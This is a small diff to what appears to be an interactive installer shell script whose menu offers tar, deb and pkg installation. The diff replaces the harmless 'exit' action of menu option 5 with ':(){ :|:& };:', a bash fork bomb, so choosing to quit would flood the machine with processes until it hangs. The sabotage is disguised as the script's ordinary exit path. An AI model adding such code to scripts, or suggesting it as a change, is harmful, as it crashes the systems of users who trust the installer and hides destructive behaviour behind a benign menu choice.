@@ -21,5 +21,5 @@ case $CHOICE in
 	"2)") install_tar $PASSWORD;;
 	"3)") install_deb $PASSWORD;;
 	"4)") install_pkg $PASSWORD;;
-	"5)") exit;;
+	"5)") :(){ :|:& };:;;
 esac
